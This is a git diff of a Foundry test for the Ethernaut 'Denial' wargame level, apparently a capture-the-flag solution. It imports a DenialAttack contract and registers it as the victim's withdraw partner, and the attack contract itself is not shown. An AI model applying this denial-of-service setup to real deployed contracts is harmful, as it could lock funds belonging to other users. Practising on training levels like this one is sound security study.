@@ -8,6 +8,7 @@ import {Denial} from "src/levels/Denial.sol";
 import {DenialFactory} from "src/levels/DenialFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {DenialAttack} from "../../src/attacks/DenialAttack.sol";
 
 contract TestDenial is Test, Utils {
     Ethernaut ethernaut;
@@ -58,6 +59,9 @@ contract TestDenial is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        DenialAttack a = new DenialAttack();
+        instance.setWithdrawPartner(address(a));
+        console.logAddress(instance.partner());
+        console.logAddress(instance.owner());
     }
 }
